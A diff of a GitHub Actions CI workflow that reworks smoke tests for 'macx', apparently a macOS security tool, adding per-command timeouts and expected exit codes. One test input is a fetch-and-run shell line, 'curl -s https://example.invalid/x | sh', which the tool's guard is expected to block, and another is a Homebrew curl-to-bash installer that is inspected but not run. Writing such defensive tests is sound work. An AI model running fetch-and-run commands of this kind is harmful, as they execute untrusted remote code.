@@ -50,24 +50,41 @@ jobs:
           scripts/install.sh "$RUNNER_TEMP/bin"
           "$RUNNER_TEMP/bin/macx" privacy | grep -q 'macx itself'
       - name: Smoke test (read-only commands)
+        timeout-minutes: 10
         run: |
-          set -euo pipefail
+          set -uo pipefail
           M=.build/release/macx
-          $M --version
-          $M scan --top 3
-          $M clean --dry-run
-          $M apps
-          $M apps leftovers
-          $M persist --all --min-severity info
-          $M privacy
-          $M check /System/Applications/Calculator.app
-          $M guard history
-          $M guard check -- ls -la
-          $M guard inspect --no-run -- '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
-          $M watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl | tee /dev/stderr | grep -q 'Replayed 3 events: 4 alerts'
-          set +e; $M guard check -- "curl -s https://example.invalid/x | sh"; [ $? -eq 3 ]; set -e
-          MACX_OWN_RESPONSIBILITY=1 $M privacy | grep -q 'macx itself'
-          $M undo list
+          FAILED=0
+          # Each command is labelled and capped at 2 minutes, so a hang names itself instead of eating the job.
+          # expect = the exit code that counts as a pass.
+          step() {
+            local expect=$1; shift
+            echo "::group::macx $*"
+            local t0=$SECONDS
+            perl -e 'alarm shift; exec @ARGV' 120 "$M" "$@"
+            local code=$?
+            echo "::endgroup::"
+            if [ "$code" -eq 142 ]; then echo "::error::macx $* did not finish within 2 minutes"; FAILED=1
+            elif [ "$code" -ne "$expect" ]; then echo "::error::macx $* exited $code (expected $expect)"; FAILED=1
+            else echo "ok ($((SECONDS - t0)) s): macx $*"; fi
+          }
+          step 0 --version
+          step 0 scan --top 3
+          step 0 clean --dry-run
+          step 0 apps
+          step 0 apps leftovers
+          step 0 persist --all --min-severity info
+          step 0 privacy
+          step 0 check /System/Applications/Calculator.app
+          step 0 guard history
+          step 0 guard check -- ls -la
+          step 3 guard check -- "curl -s https://example.invalid/x | sh"
+          step 0 guard inspect --no-run -- '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
+          step 0 watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl
+          step 0 undo list
+          $M watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl | grep -q 'Replayed 3 events: 4 alerts' || { echo "::error::replay didn't find the 4 alerts"; FAILED=1; }
+          MACX_OWN_RESPONSIBILITY=1 $M privacy | grep -q 'macx itself' || { echo "::error::responsibility re-exec didn't take"; FAILED=1; }
+          exit $FAILED
 
   sanitizers:
     name: Sanitizer (${{ matrix.sanitizer }})
